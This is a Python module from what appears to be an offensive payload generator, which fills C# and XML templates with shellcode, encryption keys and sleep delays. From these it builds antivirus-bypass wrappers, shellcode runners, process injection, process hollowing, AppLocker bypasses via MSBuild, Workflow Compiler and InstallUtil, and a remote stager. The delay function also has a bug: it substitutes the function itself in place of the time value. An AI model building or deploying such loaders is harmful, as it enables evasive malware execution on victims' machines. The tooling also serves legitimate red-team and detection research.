import os
from .utils import *

path = os.path.dirname(__file__)

def bytes_to_cs(data):
    hex_bytes = [f"0x{b:02X}" for b in data]
    return "{" + ", ".join(hex_bytes) + "}"

def delay(code, time):
    if (delay):
        return code.replace('{{DELAY}}', str(delay))
    else:
        return code

def encrypt(code, enc, key, iv):
    if enc:
        if enc.upper() == 'AES':
            return code.replace('{{KEY}}', bytes_to_cs(key)).replace('{{IV}}', bytes_to_cs(iv))
        elif enc.upper() == 'XOR' or enc.upper() == 'ROT':
            return code.replace('{{KEY}}', hex(key))
    else:
        return code

def av_bypass(shellcode, enc, key, iv, time):
    with open(os.path.join(path, 'templates/cs/av_bypass.cs'), 'r') as f:
        code = f.read()
    code = encrypt(code, enc, key, iv)
    code = delay(code, time)
    return code.replace('{{SHELLCODE}}', bytes_to_cs(shellcode))

def shellcode_runner(shellcode, enc, key, iv, time):
    with open(os.path.join(path, 'templates/cs/shellcode_runner.cs'), 'r') as f:
        code = f.read()
    payload = av_bypass(shellcode, enc, key, iv, time)
    return code.replace('{{PAYLOAD}}', payload)

def process_injection(shellcode, enc, key, iv, time, process, arch):
    with open(os.path.join(path, 'templates/cs/process_injection.cs'), 'r') as f:
        code = f.read()
    payload = av_bypass(shellcode, enc, key, iv, time)
    process_name = os.path.splitext(os.path.basename(process.replace('\\','/')))[0]
    return code.replace('{{PAYLOAD}}', payload).replace('{{PROCESS}}', process_name).replace('{{ARCH}}', str(arch.lower()=='x32').lower())

def process_hollowing(shellcode, enc, key, iv, time, process):
    with open(os.path.join(path, 'templates/cs/process_hollowing.cs'), 'r') as f:
        code = f.read()
    payload = av_bypass(shellcode, enc, key, iv, time)
    process = process.replace("/", "\\").replace("\\", "\\\\")
    return code.replace('{{PAYLOAD}}', payload).replace('{{PROCESS}}', process)

def applocker_bypass(applocker, applocker_path, url):
    xml_code=""
    cs_code=""
    if applocker.lower() == 'msbuild':
        with open(os.path.join(path, 'templates/xml/msbuild.xml'), 'r') as f:
            xml_code = f.read()
            xml_code = xml_code.replace('{{URL}}', url)
    if applocker.lower() == 'workflow_compiler':
        with open(os.path.join(path, 'templates/cs/workflow_compiler.cs'), 'r') as f:
            cs_code = f.read()
            cs_code = cs_code.replace('{{URL}}', url)
        with open(os.path.join(path, 'templates/xml/workflow_compiler.xml'), 'r') as f:
            xml_code = f.read()
            xml_code = xml_code.replace('{{PATH}}', applocker_path+'\\build.cs')

    if applocker.lower() == 'installutil':
        with open(os.path.join(path, 'templates/cs/installutil.cs'), 'r') as f:
            cs_code = f.read()
            cs_code = cs_code.replace('{{URL}}', url)
    return cs_code, xml_code

def stager(url, enc, key, iv):
    with open(os.path.join(path, 'templates/cs/stager.cs'), 'r') as f:
        code = f.read()
        code = encrypt(code, enc, key, iv)
    return code.replace('{{URL}}', url)